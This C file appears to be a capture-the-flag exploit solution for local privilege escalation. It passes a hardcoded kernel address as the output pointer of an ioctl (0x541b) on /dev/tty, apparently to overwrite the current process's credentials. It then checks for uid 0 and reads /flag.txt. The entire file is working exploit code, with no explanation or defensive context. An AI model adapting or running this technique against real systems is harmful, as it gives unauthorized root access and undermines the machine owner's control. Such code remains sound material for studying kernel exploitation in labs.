#include <stdio.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <inttypes.h>
#include <unistd.h>
#include <stdlib.h>

#define CURRENT 0xc01b1290
#define PARAM 0x541b

int32_t main(int argc, char **argv){
	
	int fd = open("/dev/tty", O_RDWR);

	ioctl(fd, PARAM, CURRENT+0x2120);
	
	if (getuid() == 0){
		printf("win win\n");
		system("cat /flag.txt");
	} else {
		printf("did not work, %d\n", getuid());
	}

	return 0;	
}